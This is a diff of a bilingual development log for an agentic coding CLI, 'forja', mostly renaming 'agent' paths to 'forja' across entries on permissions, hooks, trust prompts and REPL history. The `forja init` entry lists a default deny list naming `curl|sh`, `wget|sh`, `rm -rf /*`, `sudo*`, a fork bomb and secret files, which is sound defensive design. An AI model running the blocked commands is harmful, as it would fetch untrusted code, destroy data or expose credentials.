+- **D242 — `forja init --playbooks` skips by default.** Authors
   who hand-edited a playbook keep their changes on re-run.
   `--force` is the explicit override path. Composes with
   `--mode` flag: the playbook path ignores mode silently
@@ -27229,7 +28533,7 @@ but the eval framework's default `spawnChildProcess` would try
 to fork `bun src/evals/cli.ts --subagent-session-id ...` —
 `evals/cli.ts` is not the subagent-child entry point, so the
 spawn would fail. Doing it correctly requires either (a) a
-build of `dist/agent` before the smoke runs and an option to
+build of `dist/forja` before the smoke runs and an option to
 point `spawnChildProcess` at it, or (b) extending the eval YAML
 schema with a `spawnChildProcess` test seam. Both are
 extensions to the eval framework, out of scope for this
@@ -27931,7 +29235,7 @@ before opening a PR; documented follow-ups for the rest.
 
 | File | Change |
 |---|---|
-| `src/tools/builtin/task-cancel.ts` | `planSafe: true` → `planSafe: false`. Reviewer (slice 2 #3) caught that the cancel cascade triggers `cleanupWorktree` → `git worktree remove --force`, which mutates `.git/`. The previous claim "read-only relative to the working tree" missed `.git/`. Plan-mode-locked operators can still clean up via `agent worktree gc` (no plan gate there) or by exiting plan mode. **Supersedes D163.** |
+| `src/tools/builtin/task-cancel.ts` | `planSafe: true` → `planSafe: false`. Reviewer (slice 2 #3) caught that the cancel cascade triggers `cleanupWorktree` → `git worktree remove --force`, which mutates `.git/`. The previous claim "read-only relative to the working tree" missed `.git/`. Plan-mode-locked operators can still clean up via `forja worktree gc` (no plan gate there) or by exiting plan mode. **Supersedes D163.** |
 | `src/subagents/handle-store.ts` | (a) Spawn body now flips `record.status = 'settled'` and populates `record.settledResult` synchronously inside the async IIFE BEFORE returning, eliminating the race window where a `cancel()` between promise resolution and the post-promise `.then` could observe `status === 'running'` and emit a misleading `cancelled: true`. (b) The post-promise `.then` reject branch is removed — the spawn body now catches `spawnFn` throws locally and synthesizes the error envelope, so the underlying promise no longer rejects. (c) `awaitHandle`'s reject-branch fallback is correspondingly removed (it was unreachable). |
 | `src/harness/loop.ts` | (a) `safeInvokeOne` wrapper inside the parallel branch catches any throw escaping `invokeOne` and synthesizes a tool_result with `is_error: true`, so `runPool`'s `Promise.all` cannot orphan sibling workers in flight. (b) `allParallelSafe` predicate now also requires `tool.metadata.writes !== true` — runtime defense in depth against a future plugin / MCP-imported tool that violates the contract by declaring both `writes: true` and `parallel_safe: true`. (c) Parallel bail no longer trims `toolResults` (D167 supersedes D158): the persisted user message holds every tool_result the batch produced, matching the `tool_call` rows committed in DB. The bail snapshots `consecutiveErrors` at the moment of crossing so a sibling success after the bail can't reset the reported counter. |
 | `tests/harness/parallel.test.ts` | New `expect(result.detail).toBe('2 consecutive tool errors')` assertion locks the bail-counter snapshot. Two new tests: "parallel bail persists every tool_result in the audit message (D167)" reads the persisted `messages` row from SQLite and confirms 3 tool_result blocks; "writes:true + parallel_safe:true tool collapses batch to serial" registers a misbehaving tool that violates the metadata contract and confirms the runtime guard refuses parallel and falls back to serial via `tracker.max === 1`. |
@@ -27944,7 +29248,7 @@ before opening a PR; documented follow-ups for the rest.
 - **D168 — `safeInvokeOne` wrapper guards `runPool` against throw escapes.** The reviewer (slice 1 #5) noted that `runPool` uses `Promise.all`, which rejects on the first worker throw and orphans in-flight siblings. `invokeTool`'s contract says "tool errors return as data, never as throws", but a regression in that path would leave `tool_call` rows in `running` forever. The wrapper converts unexpected throws into a synthesized `is_error: true` tool_result so the pool always settles every worker. Belt-and-braces; today's invokeTool doesn't need it, tomorrow's might.
 - **D169 — Runtime guard against `writes: true + parallel_safe: true`.** The `ToolMetadata` doc-comment forbids the combination, but it was only a documentation rule. Reviewer (slice 1 #1) flagged that a misbehaving plugin or MCP-imported tool could violate it silently. The `allParallelSafe` predicate in `loop.ts` now also requires `writes !== true`; a violator collapses the batch to serial — the safe outcome regardless of intent. The metadata comment stays as guidance for tool authors; the runtime check is the load-bearing invariant.
 - **D170 — Status flip lives inside the spawn body, not in a post-promise `.then`.** The reviewer (slice 2 #2) pointed out the race window: a `cancel()` invoked between promise resolution and the post-promise `.then` running observed `status === 'running'` and returned `{ cancelled: true }` for a run that already settled. Moving the flip inside the async body collapses the window — the assignment lands in the same microtask the promise resolves in. The TS-side cost is a placeholder field assignment (`record.promise = ...` after IIFE construction), since `record` must exist before the IIFE captures it; the cost is one cast that documents itself.
-- **D171 — `task_cancel` is `planSafe: false`; supersedes D163.** Cancel cascading triggers worktree cleanup which writes to `.git/`. Plan mode promises observable-only; the previous "cancel is read-only relative to the working tree" claim ignored `.git/`. Operator with a leftover handle in plan mode can use `agent worktree gc` (no plan gate) or exit plan mode.
+- **D171 — `task_cancel` is `planSafe: false`; supersedes D163.** Cancel cascading triggers worktree cleanup which writes to `.git/`. Plan mode promises observable-only; the previous "cancel is read-only relative to the working tree" claim ignored `.git/`. Operator with a leftover handle in plan mode can use `forja worktree gc` (no plan gate) or exit plan mode.
 - **D172 — Test barriers are signal-driven, not wall-clock.** "cancel aborts a running spawn" / "drain cancels every running record" / "task_cancel during run" all replaced `await sleep(20)` with promises the spawnFn resolves on entry. Removes a CI-flake risk where `setTimeout`-based sleeps under load could let cancel hit before spawnFn entered its sleep, taking the `cancelled_before_dispatch` path instead.
 
 **Pending — deferred to follow-up issues (not blockers for PR):**
@@ -28676,7 +29980,7 @@ reached the operator. Now they land at
 - **`defaultSpawnChildProcess`** wires the helper with
   `opts.bgLogDir`. Production runtime always computes a
   per-session bgLogDir
-  (`<parentCwd>/.agent/bg/subagents/<childSessionId>/`), so the
+  (`<parentCwd>/.forja/bg/subagents/<childSessionId>/`), so the
   path is always available. Existing end-of-run `rmSync(bgLogDir)`
   takes the stderr.log down with the rest when bg processes
   are all terminal; when bg is stuck, the log sticks around
@@ -30130,7 +31434,7 @@ the hooks subsystem is feature-complete; ready to merge.
 - **Locked-enforcement E2E** (`tests/hooks/locked-enforcement.test.ts`,
   9 cases). Real on-disk hooks.toml fixtures across three
   isolated subdirs (passed explicitly to `resolveHookConfig` so
-  the runner's own /etc/agent / ~/.config/agent files don't
+  the runner's own /etc/forja / ~/.config/forja files don't
   pollute). Coverage:
   - Config layer: enterprise can declare `locked: true`; user/
     project declarations are downgraded to `locked=false` with
@@ -30152,7 +31456,7 @@ the hooks subsystem is feature-complete; ready to merge.
 
 1. **Locked is a layered-access control, not a runtime gate.**
    Once you can declare `locked: true` only from the enterprise
-   layer (which lives in `/etc/agent` and requires root), the
+   layer (which lives in `/etc/forja` and requires root), the
    spec's "lower layers cannot remove or override" property
    follows from the filesystem permissions + the dispatcher's
    first-block-wins. The lock flag itself is a marker for audit
@@ -30632,8 +31936,8 @@ sequence:
   §5.4 line 387 says "Move arquivo: local/<name>.md → shared/
   <name>.md" — phrasing suggests rename. We do write+delete
   because (a) cross-scope renames may cross filesystems
-  (project_shared and project_local under same `.agent/` are
-  same-fs; user scope under `~/.config/agent/memory/` may be
+  (project_shared and project_local under same `.forja/` are
+  same-fs; user scope under `~/.config/forja/memory/` may be
   different), (b) the writer's atomicity defenses (sandbox,
   symlink) would have to be reimplemented in a rename path.
   Two-step ordering means a crash window leaves source intact +
@@ -31273,7 +32577,7 @@ gaps.
   paths using `runRepl({ trustListPathOverride })` with real
   bootstrap (no `bootstrapOverride`) had divergence: REPL trusted
   the test fixture, bootstrap used the dev's real
-  `~/.config/agent/trusted_dirs.json`, so `isCwdTrusted`
+  `~/.config/forja/trusted_dirs.json`, so `isCwdTrusted`
   disagreed and memory_write rejected inferred unexpectedly.
   Conditional spread keeps the prod default semantics
   (undefined → bootstrap uses `trustListPath()`); null/string
@@ -31515,8 +32819,8 @@ Spec já existia desde 2026-05-03 (entrada `M2 / spec`); operator marcou como pr
 - **Storage layer** (HISTORY.md §1): migration `018-repl-history` cria `repl_history(id PK AUTOINCREMENT, ts, project_root, prompt)` + `INDEX (project_root, ts DESC)`. `src/storage/history.ts` expõe `appendHistory` (insert + dup-of-last suppression + cap-trim em uma transação), `loadHistory` (oldest-first slice, ts DESC interno + reverse), `searchHistory` (substring case-insensitive com escape de wildcards LIKE pra Ctrl+R), `clearHistory`, `countHistory`. Cap default 10k via `HISTORY_CAP_DEFAULT`, override via `FORJA_HISTORY_SIZE`.
 - **REPL navegação ↑/↓** (HISTORY.md §2.1): state local em `repl.ts` (`historyEntries` mirror in-memory carregado no boot, `historyIdx` + `historyScratch` + `historyEnabled` flag de sessão). Editor handler intercepta ↑/↓ ANTES de `applyKey` quando o cursor está na top-line / bottom-line do buffer (multi-line preserved); slash precedence honrada via `state.slash !== null`. Submit chama `recordHistorySubmit` que faz dup-suppress in-memory + delegates pra `appendHistory`.
 - **Reverse-search overlay** (HISTORY.md §2.2): novo `ReverseSearchState` em `LiveState`, eventos `reverse-search:update` / `:close`, render `src/tui/render/reverse-search.ts` (single-line `(reverse-i-search)\`q\`: <match>` com `<empty>` dim quando sem matches, multi-line collapse, truncate a `caps.cols`). Compose insere no mesmo slot do slash popover (mutuamente exclusivos no producer level). REPL handler trata Ctrl+R (open / cycle), Esc (cancel), Enter (substitute + submit), Tab (substitute + close, no submit), Backspace (encurta query), printable (estende), Ctrl+letter swallowed.
-- **Slash `/history`** (HISTORY.md §2.3): comando com subcommands `summary` / `list` / `clear [--yes|-y]` / `off` / `on`. Modal `history-clear:ask` com 3 opções (Yes / Yes-and-disable / No, default último). `yes-disable` escreve `.agent/no-history` + flipa flag de sessão pra ficar consistente. `SlashContext.history` (opcional) plumba `isEnabled` / `setEnabled` / `clearLocal` da REPL.
-- **First-run privacy banner** (HISTORY.md §3.2): `src/cli/history-banner.ts` com `maybeEmitHistoryBanner` puro. Skip em qualquer dos: `FORJA_NO_HISTORY=1`, `.agent/no-history`, `.agent/forja-history-acked`. Caso contrário emite 2 info lines (path da db + cap, hints de off/clear) e dropa marker `.agent/forja-history-acked` com warn-on-failure.
+- **Slash `/history`** (HISTORY.md §2.3): comando com subcommands `summary` / `list` / `clear [--yes|-y]` / `off` / `on`. Modal `history-clear:ask` com 3 opções (Yes / Yes-and-disable / No, default último). `yes-disable` escreve `.forja/no-history` + flipa flag de sessão pra ficar consistente. `SlashContext.history` (opcional) plumba `isEnabled` / `setEnabled` / `clearLocal` da REPL.
+- **First-run privacy banner** (HISTORY.md §3.2): `src/cli/history-banner.ts` com `maybeEmitHistoryBanner` puro. Skip em qualquer dos: `FORJA_NO_HISTORY=1`, `.forja/no-history`, `.forja/forja-history-acked`. Caso contrário emite 2 info lines (path da db + cap, hints de off/clear) e dropa marker `.forja/forja-history-acked` com warn-on-failure.
 - **Tests:** 23 (storage) + 4 (state reverse-search) + 2 (state history-clear) + 9 (render reverse-search) + 15 (cmd /history) + 7 (banner) + 7 novos (REPL ↑/↓ flow) + 7 novos (REPL reverse-search flow) + counts ajustados em `tests/cli/slash/dispatch.test.ts` (9→10 builtins). Stub `makeBootstrapStub` em `tests/cli/repl.test.ts` agora usa db real migrado (a fake só com `close` quebrava ao primeiro `loadHistory` no boot).
 
 **Decisions:**
@@ -31528,7 +32832,7 @@ Spec já existia desde 2026-05-03 (entrada `M2 / spec`); operator marcou como pr
 - **Reverse-search e slash popover mutuamente exclusivos no producer.** Spec §2.1 cita só `state.slash !== null` como precedência; resolvi extender pro outro lado (Ctrl+R com slash aberto não abre overlay) pra evitar overlap visual num único slot do compose. Ambos drenam o mesmo block; renderizar dois ao mesmo tempo seria confuso.
 - **`(reverse-i-search)` line trunca matches a 1 linha visual.** Multi-line prompts armazenados verbatim só importam no recall; mostrar 5 linhas no overlay quebraria a invariante de altura do live region. Match completo ainda land no buffer no Enter/Tab.
 - **`/history clear` flavor próprio (`history-clear`), não generic confirm modal.** Mesmo padrão de `permission` / `trust` / `memory-write`: each ask tem o próprio Event type + reducer case + askMethod. Generic `askConfirm` reduziria boilerplate mas acoplaria todo modal a um schema único — preferi consistency com o que já existia.
-- **`yes-disable` escreve `.agent/no-history` (level 2 da §3.3), não `FORJA_NO_HISTORY` env.** Env é process-global, file marker é per-project. "Wipe and disable for this project" só faz sentido como per-project; mexer em env pra desligar em um projeto afetaria outras REPLs em outros projetos.
+- **`yes-disable` escreve `.forja/no-history` (level 2 da §3.3), não `FORJA_NO_HISTORY` env.** Env é process-global, file marker é per-project. "Wipe and disable for this project" só faz sentido como per-project; mexer em env pra desligar em um projeto afetaria outras REPLs em outros projetos.
 - **`recordHistorySubmit` chama append em AMBOS os submit paths (slash + normal).** Bash/zsh persistem comandos slash-prefixados em history; recall via ↑ é útil tanto pra prompts ao modelo quanto pra `/budget 50` / `/sessions 30`. Footgun teórico — recall um `/history clear` antigo pode wipar — mitigado pelo modal de confirm com default No.
 - **In-memory mirror NÃO se atualiza via concurrent REPL writes.** Visibility lag explícito (HISTORY.md §1.4): a outra REPL só aparece no boot da próxima. Locking entre processos pra um nice-to-have de recall seria over-engineering — dup explícito limpa via `/history clear`.
 
@@ -31545,7 +32849,7 @@ Spec já existia desde 2026-05-03 (entrada `M2 / spec`); operator marcou como pr
 - **#1** — `/history` summary inclui `cap N` (matching spec §2.3 literal).
 - **#2** — Input box renderiza dim quando `state.reverseSearch !== null` (spec §2.2 "draft preservado abaixo, dim"). `renderInput` ganhou opção `dimmed`; compose passa o flag.
 - **#4** — `refreshReverseSearch` sanitiza `\r?\n → ' '` antes de armar state. Paste multi-line não quebra mais o row count do live region.
-- **#5+#6** — REPL seed `historyEnabled` via `historyOptOutReason(cwd)` no boot, mantendo o flag em sincronia com o que storage vai aceitar. `/history on` agora consulta `optOutReason` via `SlashContext.history` e recusa com mensagem específica ('FORJA_NO_HISTORY=1 is set in env' / '.agent/no-history marker is present') em vez de mentir "persistence: on".
+- **#5+#6** — REPL seed `historyEnabled` via `historyOptOutReason(cwd)` no boot, mantendo o flag em sincronia com o que storage vai aceitar. `/history on` agora consulta `optOutReason` via `SlashContext.history` e recusa com mensagem específica ('FORJA_NO_HISTORY=1 is set in env' / '.forja/no-history marker is present') em vez de mentir "persistence: on".
 - **#7** — Modal `history-clear` move `projectRoot` de `subject` pra `preview[0]`, alinhando com trust-modal pattern (long paths cliparem cleanly via truncateToWidth do renderer).
 - **#10+#11** — Imports de `node:fs` mergidos em uma linha (biome auto-fixed). Dead-code `text === ''` guard em `recordHistorySubmit` removido (gate já existe upstream em applyKey + slash dispatcher).
 
@@ -31561,7 +32865,7 @@ Operator reportou que o forja não pergunta se a pasta é confiável na primeira
 
 **Done:**
 
-- `src/trust/` (novo módulo): `paths.ts` espelhando `userPolicyPath` (XDG > APPDATA > HOME), `storage.ts` com load/add/isTrusted contra `~/.config/agent/trusted_dirs.json`, `index.ts` barrel.
+- `src/trust/` (novo módulo): `paths.ts` espelhando `userPolicyPath` (XDG > APPDATA > HOME), `storage.ts` com load/add/isTrusted contra `~/.config/forja/trusted_dirs.json`, `index.ts` barrel.
 - `src/tui/modal-manager.ts`: novo `askTrust(args, opts) → Promise<TrustAnswer>`. Mesma forma que `askPermission`, opções `[Yes, No]` matching o reducer existente.
 - `src/cli/repl.ts`: depois do banner, antes da posture hint, checa `isTrusted(trustPath, cwd)`. Se não trusted → `await modalManager.askTrust({ path: cwd })`. Yes → `addTrustedDir` (com `try/catch` que vira warn em falha de persistência); no/cancel → `requestShutdown` + return exitCode=0 (sem entrar no REPL).
 - Test seams: `skipTrustPrompt` (test fixtures legacy não driveriam o modal) + `trustListPathOverride` (cada test usa um tmp dir, dev machine não polui).
@@ -31570,7 +32874,7 @@ Operator reportou que o forja não pergunta se a pasta é confiável na primeira
 
 **Decisions:**
 
-- **Storage por path absoluto puro, sem aggregate hash.** Spec §9.1 line 926-936 pede hash agregado de `.agent/`, `AGENTS.md`, `.agent/playbooks/**` etc., com re-prompt em mudanças. Hardening importante mas não bloqueia o "primeiro acesso pergunta?" reportado pelo operator. Deferido pra slice futura quando team-shared trust storage também landar.
+- **Storage por path absoluto puro, sem aggregate hash.** Spec §9.1 line 926-936 pede hash agregado de `.forja/`, `AGENTS.md`, `.forja/playbooks/**` etc., com re-prompt em mudanças. Hardening importante mas não bloqueia o "primeiro acesso pergunta?" reportado pelo operator. Deferido pra slice futura quando team-shared trust storage também landar.
 - **JSON plain (não SQLite).** Trust list é lookup-on-boot + append-on-confirm: micro escala, < 100 entries em qualquer máquina realista. JSON é human-editable (operator pode hand-edit pra revogar trust); SQLite seria over-engineering.
 - **Strip de symlinks NÃO aplicado.** `cwd` já vem absoluto via bootstrap (Node resolve internamente). Realpath defense (canonicalizar antes de comparar) seria correto pra blocar symlink swap entre boots — adiar pra hash slice (mesma classe de hardening).
 - **No/Esc → exit 0, não 130.** Operator opted out conscientemente. Não é abort de operação em curso; é "não, este projeto não é meu". Exit 0 evita poluir scripts envolventes com falso "comando falhou".
@@ -31578,8 +32882,8 @@ Operator reportou que o forja não pergunta se a pasta é confiável na primeira
 
 **Pending (próximas slices):**
 
-- Aggregate hash de `.agent/` + `AGENTS.md` + `.agent/playbooks/**` (§9.1 line 926-936). Re-prompt quando hash muda.
-- File listing no preview do modal (claude-style "agent will read: AGENTS.md 12KB, .agent/permissions.yaml 8KB, ..."). Hoje preview mostra só o path.
+- Aggregate hash de `.forja/` + `AGENTS.md` + `.forja/playbooks/**` (§9.1 line 926-936). Re-prompt quando hash muda.
+- File listing no preview do modal (claude-style "agent will read: AGENTS.md 12KB, .forja/permissions.yaml 8KB, ..."). Hoje preview mostra só o path.
 - `--json` mode: spec §9.1 line 938 manda exit 3 fatal sem prompt em headless. REPL é TTY-only, então não dispara hoje; rota one-shot precisa de gate equivalente em `run.ts`.
 - MCP server trust (§9.4) — outra superfície, outra slice.
 - `/trust list/forget/forget-all` slash commands pra inspeção/revogação.
@@ -31683,31 +32987,31 @@ Bug report do operator: o soft-wrap introduzido em slice anterior usava `line.sl
 
 ---
 
-## [2026-05-03] M2 / spec+impl — `agent init` (scaffold .agent/permissions.yaml)
+## [2026-05-03] M2 / spec+impl — `forja init` (scaffold .forja/permissions.yaml)
 
-Slice anterior expôs o gap: REPL avisa em vermelho "no permission policy found" e direciona pro `/perms`, mas não tinha jeito de criar o arquivo sem o operator copiar exemplo da spec à mão. `agent init` fecha o ciclo: escreve um baseline editável strict + whitelist conservador num comando.
+Slice anterior expôs o gap: REPL avisa em vermelho "no permission policy found" e direciona pro `/perms`, mas não tinha jeito de criar o arquivo sem o operator copiar exemplo da spec à mão. `forja init` fecha o ciclo: escreve um baseline editável strict + whitelist conservador num comando.
 
 **Done:**
 
 - Spec `AGENTIC_CLI.md §2.1` ganha linha pra modo Init na tabela de operação. §8 ganha parágrafo "Bootstrap path" descrevendo o init e referenciando o cue do REPL (§17).
 - `src/cli/init-template.ts` (novo): template inline com comentários inline pra cada section. Strict default, allow whitelist coberto (`git status/diff/log/show/branch`, `ls/rg/cat/head/tail/wc/pwd/echo`), confirm pra mutações observáveis (`git add/commit/push/pull/checkout/merge/rebase`, `rm/mv/mkdir`, `npm/bun install/run/test`), deny pra catastróficas (`rm -rf /*`, `rm -rf ~*`, `sudo*`, `curl|sh`, `wget|sh`, fork bomb literal). Path-shape: read/glob/grep allow `./**` deny `.git/objects` + secrets (`.env*`, `*.pem`, `*.key`); write/edit confirm `./**` deny `.env*`/`.git/`/`node_modules`. fetch_url deny só loopback (`localhost`, `127.0.0.1`, `::1`, `0.0.0.0`) — private nets exigiriam CIDR que matcher não tem; comentário no template explica a expansão manual.
-- `src/cli/init.ts` (novo): handler `runInit({ cwd, force, mode, out, err })`. Pure FS, zero dependência de provider/DB/engine. Refuse-on-exists (exit 1) sem `--force`; com `--force` overwrites. Mensagem de sucesso aponta pro próximo passo (`run 'agent'`).
+- `src/cli/init.ts` (novo): handler `runInit({ cwd, force, mode, out, err })`. Pure FS, zero dependência de provider/DB/engine. Refuse-on-exists (exit 1) sem `--force`; com `--force` overwrites. Mensagem de sucesso aponta pro próximo passo (`run 'forja'`).
 - `src/cli/args.ts`: positional subcommand `init` reconhecido só quando `argv[0] === 'init'` — `agent "review init"` segue como prompt regular. Sub-flags `--force` e `--mode <strict|acceptEdits>`. Bypass não é scaffoldável via init (footgun; spec mantém `bypass` mas força edição manual). Usage block ganha "Subcommands:" section.
 - `src/cli/index.ts`: dispatch via `args.init !== undefined` antes do subagent-child branch e do REPL/run lazy import. Usa `process.cwd()`, sinks de stdout/stderr.
 - Tests:
   - `tests/cli/args.test.ts`: 7 novos testes pinando bare init, `--force`, `--mode acceptEdits`, rejeição de `--mode bypass`, `--mode` sem valor, flag desconhecido com scope `init:`, init-só-no-primeiro-positional (`agent "review init"` segue prompt), `init --help` roteia pro top-level help.
-  - `tests/cli/init.test.ts` (novo): 7 cenários sobre o handler — escreve, parsa via `loadPolicyFromString` (round-trip protege contra divergência template ↔ schema), `--mode acceptEdits` reflete no `defaults.mode`, refuse-on-exists preserva conteúdo original byte-a-byte, `--force` overwrites, `mkdir -p .agent/` quando ausente, success message orienta próximo passo.
+  - `tests/cli/init.test.ts` (novo): 7 cenários sobre o handler — escreve, parsa via `loadPolicyFromString` (round-trip protege contra divergência template ↔ schema), `--mode acceptEdits` reflete no `defaults.mode`, refuse-on-exists preserva conteúdo original byte-a-byte, `--force` overwrites, `mkdir -p .forja/` quando ausente, success message orienta próximo passo.
 - Smoke test no binário real (`bun src/cli/index.ts init` em `/tmp`): cria, refuse-on-exists, `--force` overwrites — todos exit codes corretos, mensagens corretas.
 
 **Decisions:**
 
-- **Positional `agent init`, não `--init <verb>`.** Trade-off de consistência (resto do parser é `--<flag>`) por muscle memory (`git init`, `npm init`, `cargo init`, `bun init`, `cargo init`). Spec §2.1 já tinha `agent doctor` positional como precedente. Custo: prompts não podem começar com a palavra literal `init`. Workaround do operador: `agent "init the build"` (quoting evita a colisão pelo shell, mas o parser ainda dispatch'a init). Documentado o constraint via test.
+- **Positional `forja init`, não `--init <verb>`.** Trade-off de consistência (resto do parser é `--<flag>`) por muscle memory (`git init`, `npm init`, `cargo init`, `bun init`, `cargo init`). Spec §2.1 já tinha `forja doctor` positional como precedente. Custo: prompts não podem começar com a palavra literal `init`. Workaround do operador: `agent "init the build"` (quoting evita a colisão pelo shell, mas o parser ainda dispatch'a init). Documentado o constraint via test.
 - **Init nunca scaffolda `bypass`.** Spec mantém os 3 modos, mas init aceita só `strict|acceptEdits` — bypass exige edição manual + flag `--dangerous` em runtime. Init é a porta da frente; uma porta da frente que oferece "no gating" como opção é uma porta da frente quebrada.
 - **fetch_url só loopback no default.** Private nets (10/8, 172.16/12, 192.168/16) precisariam CIDR; matcher é prefix+glob (CLAUDE.md hard rule). Glob `10.*` casaria `10.somewhere.com` literal — pior que não ter nada. Comentário no template aponta o caminho de adicionar hosts explícitos.
-- **Round-trip via `loadPolicyFromString` no test.** Sem isso o template podia divergir do schema da engine (uma renomeação de campo viraria erro silencioso até alguém rodar `agent init` em produção).
+- **Round-trip via `loadPolicyFromString` no test.** Sem isso o template podia divergir do schema da engine (uma renomeação de campo viraria erro silencioso até alguém rodar `forja init` em produção).
 - **`runInit` é pure FS, sem bootstrap.** Bootstrapar a engine pra escrever o arquivo da engine seria circular dependência simbólica (e prática: sem `permissions.yaml` o bootstrap usa default; com erro de parse falharia antes de poder reescrever).
 
-**Pending:** `agent doctor` (também positional, spec §2.1) ainda não impl. Não bloqueia.
+**Pending:** `forja doctor` (também positional, spec §2.1) ainda não impl. Não bloqueia.
 
 **Next:** PR de `feat/m2-tui-ux` quando operador autorizar.
 
@@ -31720,9 +33024,9 @@ Operator pediu pra ler `.gitignore` na TUI e levou `Denied` sem nenhuma explica�
 **Done:**
 
 - `src/tui/harness-adapter.ts`: `tool_finished` denied agora propaga `decision.reason` como `summary` no `tool:end`. O renderer (`render/permanent.ts:215`) já roteava `summary` pro connector `└─ ` em chips denied — só faltava popular. Confirm rejeitado pelo usuário recebe override fixo `'rejected at confirmation prompt'` (engine's reason descreve match da regra, não a escolha humana — surfaces a decisão, não o gatekeeper).
-- `src/cli/slash/commands/perms.ts` (novo): `/perms` exibe a policy ativa via `permissionEngine.policy()`. Lista mode + cada section com regras inline (cap de 5 entries por lista; > 5 colapsa pra `(N entries — see policy file)` pra não floodar scrollback). Strict + sections vazias dispara hint específico ("Create '.agent/permissions.yaml' with allow/confirm rules"). Strict mode com sections sempre fecha com `(unlisted tools default-deny in strict mode)` pra evitar a interpretação errada "no entry = allowed". Read-only — edição continua sendo via YAML files.
+- `src/cli/slash/commands/perms.ts` (novo): `/perms` exibe a policy ativa via `permissionEngine.policy()`. Lista mode + cada section com regras inline (cap de 5 entries por lista; > 5 colapsa pra `(N entries — see policy file)` pra não floodar scrollback). Strict + sections vazias dispara hint específico ("Create '.forja/permissions.yaml' with allow/confirm rules"). Strict mode com sections sempre fecha com `(unlisted tools default-deny in strict mode)` pra evitar a interpretação errada "no entry = allowed". Read-only — edição continua sendo via YAML files.
 - `src/cli/slash/index.ts`: `permsCommand` registrado (slot 9 após `budget`). Já estava no spec `AGENTIC_CLI §160`, então sem amendment necessário.
-- `src/cli/repl.ts`: detecta `policyLayers.length === 0` no boot e emite info line "no permission policy found — strict default-deny is active. Create '.agent/permissions.yaml' or run /perms to inspect.". Só dispara quando NENHUM layer (enterprise/user/project) contribuiu — operador com policy customizada já optou pelo posture e não precisa do cue. Lê `policyLayers` (já exposto por `BootstrapResult` desde commit anterior, mas ninguém consumia).
+- `src/cli/repl.ts`: detecta `policyLayers.length === 0` no boot e emite info line "no permission policy found — strict default-deny is active. Create '.forja/permissions.yaml' or run /perms to inspect.". Só dispara quando NENHUM layer (enterprise/user/project) contribuiu — operador com policy customizada já optou pelo posture e não precisa do cue. Lê `policyLayers` (já exposto por `BootstrapResult` desde commit anterior, mas ninguém consumia).
 
 **Tests:**
 
@@ -31732,11 +33036,11 @@ Operator pediu pra ler `.gitignore` na TUI e levou `Denied` sem nenhuma explica�
 
 **Decisions:**
 
-- **Por que não um banner de "first-run nag" persistente?** Hint no banner basta — repete a cada boot que não tem `.agent/permissions.yaml`, então o operador não esquece. Marker de "já viu" exigiria escrita em disco, e o trigger é trivialmente reversível (criar o arquivo) — UX overengineered.
+- **Por que não um banner de "first-run nag" persistente?** Hint no banner basta — repete a cada boot que não tem `.forja/permissions.yaml`, então o operador não esquece. Marker de "já viu" exigiria escrita em disco, e o trigger é trivialmente reversível (criar o arquivo) — UX overengineered.
 - **Por que `summary` em vez de modificar `subject`?** `subject` é o "subject of the tool call" (`bash $command`, `read_file $path`), invariável de fluxo de denial; `summary` foi desenhado pro connector exibir o pós-fato ("read 12 lines", "exited 0"). Denied chip já preferia `summary` quando presente — só faltava a fonte.
-- **Por que não auto-criar `.agent/permissions.yaml`?** Spec §8 aspira `agent init-policy` num slice futuro; auto-criar arbitrariamente seria opinião sobre default ruleset que não tem consenso ainda. Hint guia o operador a criar manualmente até esse comando existir.
+- **Por que não auto-criar `.forja/permissions.yaml`?** Spec §8 aspira `forja init-policy` num slice futuro; auto-criar arbitrariamente seria opinião sobre default ruleset que não tem consenso ainda. Hint guia o operador a criar manualmente até esse comando existir.
 
-**Pending:** comando `agent init-policy` pra scaffolding (spec §8 list line 160). Não bloqueia este slice — operator já tem hint + `/perms` pra inspecionar.
+**Pending:** comando `forja init-policy` pra scaffolding (spec §8 list line 160). Não bloqueia este slice — operator já tem hint + `/perms` pra inspecionar.
 
 **Next:** PR de `feat/m2-tui-ux` quando operador autorizar.
 
@@ -31756,7 +33060,7 @@ UI.md §5.4 já tinha as keybindings de ↑/↓ e Ctrl+R listadas, mas o subsist
   - §4 cross-cutting (multi-line prompts, separação de `messages` table, resume não popula history, headless mode skip).
   - §5 estimativa de impl (~700-900 LoC + ~600 tests, ~3 dias).
   - §6 não-objetivos (busca semântica, history expansion bash-style, sync cross-machine, edição inline, fish-style auto-suggest).
-- UI.md §5.1 + §5.4 cross-ref pra HISTORY.md (substituiu o stub antigo "persistido em .agent/state/input-history.txt" que ficou divergente do design real SQLite-based).
+- UI.md §5.1 + §5.4 cross-ref pra HISTORY.md (substituiu o stub antigo "persistido em .forja/state/input-history.txt" que ficou divergente do design real SQLite-based).
 - CLAUDE.md tabela de "Implementing X → Read Y" ganha linha pra HISTORY.
 
 **Decisions:**
@@ -32017,7 +33321,7 @@ This slice adds a parallel `abortCause?: 'soft' | 'hard'` field that's threaded 
 - **D166 — Parallel field, not split ExitReason.** Considered `'aborted_soft' \| 'aborted_hard'` as ExitReason variants. Rejected because: (a) every existing consumer that switches on `reason === 'aborted'` would have to handle two cases or risk a silent fallthrough, (b) the adapter's `mapExitReason` (and any future audit query) would need to special-case both, (c) the two represent the same outcome ("operator interrupted") with different mechanism — `reason` describes what; `abortCause` describes how. Parallel field is additive, type-safe (the discriminator only exists on aborted results), and trivially ignorable for consumers that don't care.
 - **D167 — Threaded via `finish()`, not per-call-site.** Considered post-processing the result in `runAgent`'s outer return. Rejected — the cause is known at the call site (which signal fired), not derivable from the result shape. Threading through `finish()` keeps the discriminator close to the truth source. The optional third param means existing `finish('maxSteps')` calls don't change.
 - **D168 — Subagent runtime not extended (out of scope).** `RunSubagentResult` (in `src/subagents/runtime.ts`) has its own `reason: 'aborted'` path for the subprocess wait loop. Not extended in this slice because: (a) subprocess subagents only honor hard signals today (D159 — soft can't propagate without IPC), so the discriminator would always be `'hard'` and is information-free, (b) `RunSubagentResult` and `HarnessResult` are different types — adding the field on both would force consumers to duplicate the narrowing logic. When the IPC slice lands and subagents honor soft, this field gets added in the same change.
